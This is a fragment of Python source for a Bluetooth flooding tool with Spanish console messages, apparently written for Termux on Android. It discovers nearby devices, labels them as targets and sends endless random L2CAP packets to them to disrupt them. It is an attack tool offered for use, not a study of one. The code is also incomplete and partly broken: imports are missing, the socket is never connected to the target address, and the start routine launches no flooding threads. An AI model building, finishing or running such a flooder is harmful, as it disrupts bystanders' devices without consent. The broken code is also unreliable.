class BluetoothFlooder:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {'packets_sent': 0, 'devices_found': 0, 'errors': 0, 'start_time': time.time()}
        self.targets = []
        
    def discover_devices(self):
        if not HAS_BLUETOOTH:
            self.error_msg()
            return []
        console.print("[bold cyan]🔍 Escaneando dispositivos Bluetooth...[/bold cyan]")
        try:
            devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True)
            self.targets = [{'mac': addr, 'name': name if name else 'Desconocido'} for addr, name in devices]
            return devices
        except Exception as e:
            console.print(f"[bold red]❌ Error de hardware: {e}[/bold red]")
            return []

    def error_msg(self):
        msg = "\n[bold red]❌ ERROR: Módulo 'bluetooth' no encontrado.[/bold red]\n"
        msg += "[yellow]Para solucionar esto en Termux, ejecutá:[/yellow]\n"
        msg += "[green]pkg install libbluetooth-dev -y && pip install pybluez2 --pre[/green]\n"
        console.print(Panel(msg, title="[bold white]DEPENDENCIA FALTANTE[/bold white]", border_style="red"))

    def flood(self, target_mac):
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            while self.running:
                try:
                    sock.send(os.urandom(100))
                    self.stats['packets_sent'] += 1
                except:
                    self.stats['errors'] += 1
        except: pass

    def start_flood(self):
        if not HAS_BLUETOOTH: return self.error_msg()
        self.running = True
        console.print("[bold red]🚀 Flood iniciado contra objetivos detectados.[/bold red]")

